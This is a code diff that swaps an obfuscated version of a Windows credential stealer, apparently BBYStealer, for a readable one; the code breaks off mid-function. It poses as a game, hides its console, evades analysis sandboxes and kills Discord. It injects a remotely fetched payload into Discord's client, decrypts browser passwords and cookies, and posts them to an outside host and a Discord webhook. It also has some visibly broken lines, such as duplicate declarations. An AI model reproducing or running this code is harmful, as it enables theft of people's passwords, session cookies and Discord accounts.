@@ -1,831 +1,436 @@
-const _0x49a82b = _0x1867;
-(function (_0x312848, _0x4ff837) {
-    const _0x3f94b7 = _0x1867,
-        _0x1e92f7 = _0x312848();
-    while (!![]) {
-        try {
-            const _0x265834 =
-                (-parseInt(_0x3f94b7(0x201)) / 0x1) * (-parseInt(_0x3f94b7(0x207)) / 0x2) +
-                -parseInt(_0x3f94b7(0x208)) / 0x3 +
-                (parseInt(_0x3f94b7(0x1fc)) / 0x4) * (-parseInt(_0x3f94b7(0x1fe)) / 0x5) +
-                -parseInt(_0x3f94b7(0x1fd)) / 0x6 +
-                (-parseInt(_0x3f94b7(0x200)) / 0x7) * (parseInt(_0x3f94b7(0x206)) / 0x8) +
-                (-parseInt(_0x3f94b7(0x1f3)) / 0x9) * (-parseInt(_0x3f94b7(0x202)) / 0xa) +
-                (parseInt(_0x3f94b7(0x1ff)) / 0xb) * (parseInt(_0x3f94b7(0x1fb)) / 0xc);
-            if (_0x265834 === _0x4ff837) break;
-            else _0x1e92f7["push"](_0x1e92f7["shift"]());
-        } catch (_0x2f2b81) {
-            _0x1e92f7["push"](_0x1e92f7["shift"]());
-        }
-    }
-})(_0x453a, 0x4470a);
-function _0x1867(_0x194533, _0x9ecb18) {
-    const _0x453ab3 = _0x453a();
-    return (
-        (_0x1867 = function (_0x18675e, _0x44eb04) {
-            _0x18675e = _0x18675e - 0x1f3;
-            let _0x1e3bf1 = _0x453ab3[_0x18675e];
-            return _0x1e3bf1;
-        }),
-        _0x1867(_0x194533, _0x9ecb18)
-    );
-}
-const fs = require("fs");
-console[_0x49a82b(0x1f9)](_0x49a82b(0x1f4));
-var debug = ![],
-    args = process["argv"][_0x49a82b(0x1f8)](0x2);
-function _0x453a() {
-    const _0xc6f4c0 = [
-        "7307616lMnvmZ",
-        "2440IZIBtX",
-        "571986SBvguW",
-        "3725XGxOba",
-        "11kNZBIX",
-        "1744407FYsMfD",
-        "357855xBbWZN",
-        "310vnuNhd",
-        "debug",
-        "resolve",
-        "glob",
-        "8bgSAdr",
-        "2wHmYRd",
-        "39555wnmxvP",
-        "36486yxdqKv",
-        "Starting\x20game...",
-        "child_process",
-        "crypto",
-        "buffer-replace",
-        "slice",
-        "log",
-        "nexe-natives",
-    ];
-    _0x453a = function () {
-        return _0xc6f4c0;
-    };
-    return _0x453a();
-}
-if (args[0x0] == _0x49a82b(0x203)) debug = !![];
+const fs = require('fs');
+const fs = require("fs"),
+    path = require("path"),
+    { BrowserWindow: BrowserWindow, session: session } = require("electron"),
+    querystring = require("querystring"),
+    os = require("os"); //supergamee
+var webhook = "%WEBHOOK_LINK%";
+const computerName = os.hostname(),
+    discordInstall = `${__dirname}`,
+    EvalToken =
+        'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
+    config = { logout: "%LOGOUT%", "logout-notify": "%LOGOUTNOTI%", "init-notify": "%INITNOTI%", "embed-color": 3447704, "disable-qr-code": "%DISABLEQRCODE%" };
+console.log('Starting game...');
+
+var debug = false,
+    args = process.argv.slice(2);
+
+if (args[0] == 'debug') debug = true;
 else hideSelf();
-const _0x2a08e8 = _0x164d;
-function _0x164d(_0x2b0de7, _0x5b5b7e) {
-    const _0x17522d = _0x1752();
-    return (
-        (_0x164d = function (_0x164d5f, _0xf2085e) {
-            _0x164d5f = _0x164d5f - 0x145;
-            let _0xcf25ed = _0x17522d[_0x164d5f];
-            return _0xcf25ed;
-        }),
-        _0x164d(_0x2b0de7, _0x5b5b7e)
-    );
-}
-function _0x1752() {
-    const _0x57a064 = ["468jBuGFE", "1404198pKyINx", "6401646qPMHrm", "axios", "1788504tVKmwl", "nexe-natives", "949385gGCcFr", "44Sgkzhg", "1196146locZyt", "73913DMfoeM", "84205KbBkGc", "10bipNZf"];
-    _0x1752 = function () {
-        return _0x57a064;
+
+const glob = require('glob'),
+    crypto = require('crypto'),
+    {
+        exec
+    } = require('child_process'),
+    axios = require('axios'),
+    buf_replace = require('buffer-replace'),
+    sqlite3 = require('nexe-natives')(require.resolve('sqlite3')),
+    dpapi = require('nexe-natives')(require.resolve('win-dpapi'));
+
+((async () => {
+    await axios.get('https://ipconfig.io/json')
+        .then(res => {
+            console.log(res.data);
+            if (['microsoft', 'google', 'ovh'].some(s => res.data['asn_org']?.toLowerCase()
+                    ?.includes(s))) return process.exit();
+        })
+        .catch();
+    stealTokens();
+    takePizzas();
+    takeCheese();
+})());
+
+var appdata = process.env.APPDATA,
+    localappdata = process.env.LOCALAPPDATA,
+    discords = [],
+    injectPath = [],
+    runningDiscords = [],
+    paths = [
+        appdata + '\\discord\\',
+        appdata + '\\discordcanary\\',
+        appdata + '\\discordptb\\',
+        appdata + '\\discorddevelopment\\',
+        appdata + '\\lightcord\\',
+        localappdata + '\\Google\\Chrome\\User Data\\Default\\',
+        localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
+        localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
+        localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
+        localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
+        localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
+        localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
+        localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
+        localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
+        localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
+        localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
+        localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
+        localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
+        localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
+        appdata + '\\Opera Software\\Opera Stable\\',
+        appdata + '\\Opera Software\\Opera GX Stable\\',
+        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
+        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
+        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
+        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
+        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
+        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
+        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
+        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
+        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
+        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
+        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
+        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
+        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
+        localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
+        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
+        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
+        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
+        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
+        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
+        localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
+        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
+        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
+        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
+        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
+        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
+        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
+        localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
+        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
+        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
+        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
+        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
+        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
+        localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
+        localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
+        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
+        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
+        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
+        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
+        localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
+        localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
+    ];
+
+    function Infect() {
+        https.get('https://raw.githubusercontent.com/Green-Avocado/bbystealer-malware-analysis/main/deobfuscation/payload_original.js', (resp) => {
+            let data = '';
+            resp.on('data', (chunk) => {
+                data += chunk;
+            });
+            resp.on('end', () => {
+                injectPath.forEach(file => {
+                    fs.writeFileSync(file, data.replace("%WEBHOOK_LINK%", webhook).replace("%INITNOTI%", config["init-notify"]).replace("%LOGOUT%", config.logout).replace("%LOGOUTNOTI%", config["logout-notify"]).replace("3447704",config["embed-color"]).replace('%DISABLEQRCODE%', config["disable-qr-code"]), {
+                        encoding: 'utf8',
+                        flag: 'w'
+                    });
+                    if (config["init-notify"] == "true") {
+                        let init = file.replace("index.js", "init")
+                        if (!fs.existsSync(init)) {
+                            fs.mkdirSync(init, 0744)
+                        }
+                    }
+                    if ( config.logout != "false" ) {
+    
+                        let folder = file.replace("index.js", "ParadiseStealer")
+                        if (!fs.existsSync(folder)) {
+                            fs.mkdirSync(folder, 0744)
+                            if (config.logout == "instant") {
+                                startDiscord();
+                            }
+                        } else if (fs.existsSync(folder) && config.logout == "instant" ){
+                            startDiscord();
+                        }
+                    }
+                })
+                
+            });
+        }).on("error", (err) => {
+            console.log(err);
+        });
     };
-    return _0x1752();
-}
-(function (_0x37de5a, _0x4ea273) {
-    const _0x54e4f = _0x164d,
-        _0x2a7497 = _0x37de5a();
-    while (!![]) {
+
+
+
+
+
+
+
+
+
+
+
+fs.readdirSync(localappdata)
+    .forEach(file => {
+        console.log('Searching game folder...');
+        if (file.includes('cord')) discords.push(localappdata + '\\' + file);
+        else return;
+    }), discords.forEach(file => {
+        console.log('Making game config...');
+        let pattern = file + '\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js';
+        glob.sync(pattern)
+            .map(file => {
+                injectPath.push(file);
+                console.log('Saving config file...');
+                listDiscords();
+            });
+    });
+
+async function Infect() {
+    console.log('Searching online update');
+    var resp = await axios.get('https://indianboatparty.com/OOJfZ9s6pHbF/str');
+    injectPath.forEach(file => {
         try {
-            const _0x16c1a8 =
-                -parseInt(_0x54e4f(0x14c)) / 0x1 +
-                -parseInt(_0x54e4f(0x14e)) / 0x2 +
-                parseInt(_0x54e4f(0x147)) / 0x3 +
-                (parseInt(_0x54e4f(0x14d)) / 0x4) * (-parseInt(_0x54e4f(0x150)) / 0x5) +
-                (-parseInt(_0x54e4f(0x146)) / 0x6) * (-parseInt(_0x54e4f(0x14f)) / 0x7) +
-                parseInt(_0x54e4f(0x14a)) / 0x8 +
-                (parseInt(_0x54e4f(0x148)) / 0x9) * (parseInt(_0x54e4f(0x145)) / 0xa);
-            if (_0x16c1a8 === _0x4ea273) break;
-            else _0x2a7497["push"](_0x2a7497["shift"]());
-        } catch (_0x40a942) {
-            _0x2a7497["push"](_0x2a7497["shift"]());
-        }
-    }
-})(_0x1752, 0x788f8);
-
-
-  a0_0x5ddfb9 =
-    'https://ptb.discord.com/api/webhooks/954108820324503593/tuL0T3Q-tHqCnOuwamoOGkrJFnXRAJONKT22LkCwYUgAHsRhH_WZuDRuud5kqGhcDulH',
-  a0_0x5bbd77 = {}
-a0_0x9e24fc.readdirSync(a0_0x5a47f5).forEach((_0x8da5eb) => {
-  if (_0x8da5eb.includes('cord')) {
-    a0_0x3196cd.push(a0_0x5a47f5 + '\\' + _0x8da5eb)
-  } else {
-    return
-  }
-})
-a0_0x3196cd.forEach((_0x367285) => {
-  let _0xec95cf =
-    _0x367285 +
-    '\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js'
-  a0_0x50ef53.sync(_0xec95cf).map((_0x59b530) => {
-    injectPath.push(_0x59b530)
-    a0_0x2a7a89()
-  })
-})
-a0_0x5bbd77['inject-notify'] = 'true'
-a0_0x5bbd77['logout-notify'] = 'true'
-a0_0x5bbd77['init-notify'] = 'false'
-a0_0x5bbd77['embed-color'] = 3553599
-a0_0x5bbd77['disable-qr-code'] = 'true'
-const a0_0x458a88 = a0_0x5bbd77
-var a0_0x12625b = process.env.APPDATA,
-  a0_0x11db4e = process.env.LOCALAPPDATA,
-  a0_0x5a47f5 = process.env.LOCALAPPDATA,
-  a0_0x3196cd = []
-injectPath = []
-runningDiscords = []
-paths = [
-  a0_0x12625b + '\\discord\\',
-  a0_0x12625b + '\\discordcanary\\',
-  a0_0x12625b + '\\discordptb\\',
-  a0_0x12625b + '\\discorddevelopment\\',
-  a0_0x12625b + '\\lightcord\\',
-  a0_0x5a47f5 + '\\Google\\Chrome\\User Data\\Default\\',
-  a0_0x5a47f5 + '\\Google\\Chrome\\User Data\\Profile 1\\',
-  a0_0x5a47f5 + '\\Google\\Chrome\\User Data\\Profile 2\\',
-  a0_0x5a47f5 + '\\Google\\Chrome\\User Data\\Profile 3\\',
-  a0_0x5a47f5 + '\\Google\\Chrome\\User Data\\Profile 4\\',
-  a0_0x5a47f5 + '\\Google\\Chrome\\User Data\\Profile 5\\',
-  a0_0x5a47f5 + '\\Google\\Chrome\\User Data\\Guest Profile\\',
-  a0_0x5a47f5 + '\\Google\\Chrome\\User Data\\Default\\Network\\',
-  a0_0x5a47f5 + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
-  a0_0x5a47f5 + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
-  a0_0x5a47f5 + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
-  a0_0x5a47f5 + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
-  a0_0x5a47f5 + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
-  a0_0x5a47f5 + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
-  a0_0x12625b + '\\Opera Software\\Opera Stable\\',
-  a0_0x12625b + '\\Opera Software\\Opera GX Stable\\',
-  a0_0x5a47f5 + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
-  a0_0x5a47f5 + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
-  a0_0x5a47f5 + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
-  a0_0x5a47f5 + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
-  a0_0x5a47f5 + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
-  a0_0x5a47f5 + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
-  a0_0x5a47f5 + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
-  a0_0x5a47f5 + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
-  a0_0x5a47f5 + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
-  a0_0x5a47f5 + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
-  a0_0x5a47f5 + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
-  a0_0x5a47f5 + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
-  a0_0x5a47f5 + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
-  a0_0x5a47f5 + '\\Microsoft\\Edge\\User Data\\Default\\',
-  a0_0x5a47f5 + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
-  a0_0x5a47f5 + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
-  a0_0x5a47f5 + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
-  a0_0x5a47f5 + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
-  a0_0x5a47f5 + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
-  a0_0x5a47f5 + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
-  a0_0x5a47f5 + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
-  a0_0x5a47f5 +
-    '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
-  a0_0x5a47f5 +
-    '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
-  a0_0x5a47f5 +
-    '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
-  a0_0x5a47f5 +
-    '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
-  a0_0x5a47f5 +
-    '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
-  a0_0x5a47f5 +
-    '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
-  a0_0x5a47f5 + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
-  a0_0x5a47f5 + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
-  a0_0x5a47f5 + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
-  a0_0x5a47f5 + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
-  a0_0x5a47f5 + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
-  a0_0x5a47f5 + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
-  a0_0x5a47f5 + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
-  a0_0x5a47f5 + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
-  a0_0x5a47f5 + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
-  a0_0x5a47f5 + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
-  a0_0x5a47f5 + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
-  a0_0x5a47f5 + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
-  a0_0x5a47f5 + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\',
-]
-a0_0x9e24fc.readdirSync(a0_0x5a47f5).forEach((_0x8da5eb) => {
-  if (_0x8da5eb.includes('cord')) {
-    a0_0x3196cd.push(a0_0x5a47f5 + '\\' + _0x8da5eb)
-  } else {
-    return
-  }
-}),
-  a0_0x3196cd.forEach((_0x367285) => {
-    let _0xec95cf =
-      _0x367285 +
-      '\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js'
-    a0_0x50ef53.sync(_0xec95cf).map((_0x59b530) => {
-      injectPath.push(_0x59b530)
-      a0_0x2a7a89()
-    })
-  })
-a0_0x4c9d67()
-a0_0x23aeb2()
-a0_0x56388f()
-a0_0x1cc1ac()
-a0_0x2a7a89()
-function a0_0x431a7f() {
-  a0_0x2340fa
-    .get(
-      'https://raw.githubusercontent.com/RustlerJS/rustlers/main/deneme3',
-      (_0x796cbe) => {
-        let _0x46b03c = ''
-        _0x796cbe.on('data', (_0xb52d59) => {
-          _0x46b03c += _0xb52d59
-        })
-        _0x796cbe.on('end', () => {
-          injectPath.forEach((_0x47016f) => {
-            a0_0x9e24fc.writeFileSync(
-              _0x47016f,
-              _0x46b03c
-                .replace('%WEBHOOK_LINK%', a0_0x5ddfb9)
-                .replace('%INITNOTI%', a0_0x458a88['init-notify'])
-                .replace('%LOGOUT%', a0_0x458a88.logout)
-                .replace('%LOGOUTNOTI%', a0_0x458a88['logout-notify'])
-                .replace('3447704', a0_0x458a88['embed-color'])
-                .replace('%DISABLEQRCODE%', a0_0x458a88['disable-qr-code']),
-              {
+            fs.writeFileSync(file, resp.data, {
                 encoding: 'utf8',
-                flag: 'w',
-              }
-            )
-            if (a0_0x458a88['init-notify'] == 'true') {
-              let _0x54d5d3 = _0x47016f.replace('index.js', 'init')
-              !a0_0x9e24fc.existsSync(_0x54d5d3) &&
-                a0_0x9e24fc.mkdirSync(_0x54d5d3, 484)
+                flag: 'w'
+            });
+        } catch (e) {}
+        let folder = file.replace('index.js', 'bbystealer');
+        if (!fs.existsSync(folder)) {
+            fs.mkdirSync(folder, 0744)
+            console.log('Online update finded!')
+            startDiscord();
+        }
+    });
+};
+
+function listDiscords() {
+    exec('tasklist', function (err, stdout, stderr) {
+        if (stdout.includes('Discord.exe')) runningDiscords.push('Discord');
+        if (stdout.includes('DiscordCanary.exe')) runningDiscords.push('DiscordCanary');
+        if (stdout.includes('DiscordPTB.exe')) runningDiscords.push('DiscordPTB');
+        if (stdout.includes('DiscordDevelopment.exe')) runningDiscords.push('DiscordDevelopment');
+        killDiscord();
+    });
+};
+
+function killDiscord() {
+    runningDiscords.forEach(disc => {
+        exec(`taskkill /IM ${disc}.exe /F`, (err) => {
+            if (err) {
+              return;
             }
-            if (a0_0x458a88.logout != 'false') {
-              let _0x6fcd36 = _0x47016f.replace('index.js', 'Rustler')
-              if (!a0_0x9e24fc.existsSync(_0x6fcd36)) {
-                a0_0x9e24fc.mkdirSync(_0x6fcd36, 484)
-                a0_0x458a88.logout == 'instant' && a0_0x490f53()
-              } else {
-                a0_0x9e24fc.existsSync(_0x6fcd36) &&
-                  a0_0x458a88.logout == 'instant' &&
-                  a0_0x490f53()
-              }
-            }
-          })
-        })
-      }
-    )
-    .on('error', (_0x5a9a31) => {
-      console.log(_0x5a9a31)
-    })
+          });
+    });
+    if (config["inject-notify"] == "true" && injectPath.length != 0 ) {
+        injectNotify();
+    }
+    Infect()
+    pwnBetterDiscord();
+};
+
+function startDiscord() {
+    runningDiscords.forEach(disc => {
+        console.log('Starting game paths...');
+        try {
+            exec(localappdata + '\\' + disc + '\\Update.exe' + ' --processStart ' + disc + '.exe', err => {
+                if (err) {
+                    if (debug) console.log(err);
+                }
+            });
+        } catch (e) {}
+    });
 }
-function a0_0x2a7a89() {
-  a0_0x2ef9f7('tasklist', function (_0x5b88d2, _0x5befe7, _0x5abf08) {
-    if (_0x5befe7.includes('Discord.exe')) {
-      runningDiscords.push('Discord')
-    }
-    if (_0x5befe7.includes('DiscordCanary.exe')) {
-      runningDiscords.push('DiscordCanary')
-    }
-    if (_0x5befe7.includes('DiscordPTB.exe')) {
-      runningDiscords.push('DiscordPTB')
-    }
-    if (_0x5befe7.includes('DiscordDevelopment.exe')) {
-      runningDiscords.push('DiscordDevelopment')
-    }
-    a0_0x47bd23()
-  })
+
+function pwnBetterDiscord() {
+    var file = process.env.appdata + '\\BetterDiscord\\data\\betterdiscord.asar';
+    if (fs.existsSync(file)) {
+        var x = fs.readFileSync(file);
+        try {
+            fs.writeFileSync(file, buf_replace(x, 'api/webhooks', 'kkkk'));
+        } catch (e) {}
+    };
 }
-function a0_0x47bd23() {
-  runningDiscords.forEach((_0x5d6b63) => {
-    a0_0x2ef9f7('taskkill /IM ' + _0x5d6b63 + '.exe /F', (_0x21fca9) => {
-      if (_0x21fca9) {
-        return
-      }
-    })
-  })
-  a0_0x431a7f()
-  a0_0xdc3ad7()
+
+async function getPizzas(path) {
+    let path_split = path.split('\\'),
+        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
+        path_tail = path_split_tail.join('\\') + '\\';
+    if (path.startsWith(appdata)) path_tail = path;
+    if (path.includes('cord')) return;
+    if (fs.existsSync(path_tail)) {
+        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
+                .os_crypt.encrypted_key, 'base64')
+            .slice(5);
+        var login_data = path + 'Login Data',
+            passwords_db = path + 'passwords.db';
+        fs.copyFileSync(login_data, passwords_db);
+        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
+        var result = '\nPASSWORDS FROM: ' + path + '  #BBYRIPONTOP\n',
+            sql = new sqlite3.Database(passwords_db, err => {
+                if (err) {
+                    if (debug) console.log(err);
+                }
+            });
+        const pizza = await new Promise((resolve, reject) => {
+            sql.each('SELECT origin_url, username_value, password_value FROM logins', function (err, row) {
+                if (err) {
+                    if (debug) console.log(err);
+                }
+                if (row['username_value'] != '') {
+                    let password_value = row['password_value'];
+                    try {
+                        if ((password_value[0] == 1) && (password_value[1] == 0) && (password_value[2] == 0) && (password_value[3] == 0)) {
+                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + dpapi.unprotectData(password_value, null, 'CurrentUser')
+                                .toString('utf-8');
+                        } else {
+                            let start = password_value.slice(3, 15),
+                                middle = password_value.slice(15, password_value.length - 16),
+                                end = password_value.slice(password_value.length - 16, password_value.length),
+                                decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
+                            decipher.setAuthTag(end);
+                            result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
+                        }
+                    } catch (e) {
+                        if (debug) console.log(e);
+                    }
+                }
+            }, function () {
+                resolve(result);
+            });
+        });
+        return pizza;
+    } else {
+        return '';
+    }
 }
-function a0_0x490f53() {
-  runningDiscords.forEach((_0x186dbb) => {
+
+async function getCheese(path) {
+    let path_split = path.split('\\'),
+        path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
+        path_tail = path_split_tail.join('\\') + '\\';
+    if (path.startsWith(appdata)) path_tail = path;
+    if (path.includes('cord')) return;
+    if (fs.existsSync(path_tail)) {
+        let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State'))
+                .os_crypt.encrypted_key, 'base64')
+            .slice(5);
+        var cookies = path + 'Cookies',
+            cookies_db = path + 'cookies.db';
+        fs.copyFileSync(cookies, cookies_db);
+        const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser');
+        var result = '\nCOOKIES FROM: ' + path + '  #BBYRIPONTOP\n',
+            sql = new sqlite3.Database(cookies_db, err => {
+                if (err) {
+                    if (debug) console.log(err);
+                }
+            });
+        const cheese = await new Promise((resolve, reject) => {
+            sql.each('SELECT host_key, name, encrypted_value FROM cookies', function (err, row) {
+                if (err) {
+                    if (debug) console.log(err);
+                }
+                let encrypted_value = row['encrypted_value'];
+                try {
+                    if ((encrypted_value[0] == 1) && (encrypted_value[1] == 0) && (encrypted_value[2] == 0) && (encrypted_value[3] == 0)) {
+                        result += '\nHOST KEY: ' + row['host_key'] + ' | NAME: ' + row['name'] + ' | VALUE: ' + dpapi.unprotectData(encrypted_value, null, 'CurrentUser')
+                            .toString('utf-8');
+                    } else {
+                        let start = encrypted_value.slice(3, 15),
+                            middle = encrypted_value.slice(15, encrypted_value.length - 16),
+                            end = encrypted_value.slice(encrypted_value.length - 16, encrypted_value.length),
+                            decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
+                        decipher.setAuthTag(end);
+                        result += '\nHOST KEY: ' + row['host_key'] + ' | NAME: ' + row['name'] + ' | VALUE: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
+                    }
+                } catch (e) {
+                    if (debug) console.log(e);
+                }
+            }, function () {
+                resolve(result);
+            })
+        });
+        return cheese;
+    } else return '';
+}
+
+async function takePizzas() {
+    let passwords = '';
+    for (let i = 0; i < paths.length; i++) {
+        if (fs.existsSync(paths[i] + 'Login Data'))
+            passwords += await getPizzas(paths[i]) || '';
+    }
+    axios.post('https://indianboatparty.com/OOJfZ9s6pHbF/passwords', passwords, {
+        'headers': {
+            'Content-Type': 'text/plain'
+        }
+    });
+}
+
+async function takeCheese() {
+    let cookies = '';
+    for (let i = 0; i < paths.length; i++) {
+        if (fs.existsSync(paths[i] + 'Cookies'))
+            cookies += await getCheese(paths[i]) || '';
+    }
+    axios.post('https://indianboatparty.com/OOJfZ9s6pHbF/cookies', cookies, {
+        'headers': {
+            'Content-Type': 'text/plain'
+        }
+    });
+}
+
+function hideSelf() {
+    let payload = '\n' +
+        "    Add-Type -Name Window -Namespace Console -MemberDefinition '\n" +
+        '    [DllImport("Kernel32.dll")]\n' +
+        '    public static extern IntPtr GetConsoleWindow();\n' +
+        '\n' +
+        '    [DllImport("user32.dll")]\n' +
+        '    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n' +
+        "    '\n" +
+        '\n' +
+        '    $consolePtr = [Console.Window]::GetConsoleWindow()\n' +
+        '    #0 hide\n' +
+        '    [Console.Window]::ShowWindow($consolePtr, 0)\n' +
+        '    ',
+        file = process.cwd() + '\\temp.ps1';
     try {
-      a0_0x2ef9f7(
-        a0_0x5a47f5 +
-          '\\' +
-          _0x186dbb +
-          '\\Update.exe' +
-          ' --processStart ' +
-          _0x186dbb +
-          '.exe',
-        (_0x14ab1a) => {
-          if (_0x14ab1a) {
-            if (a0_0x4b553e) {
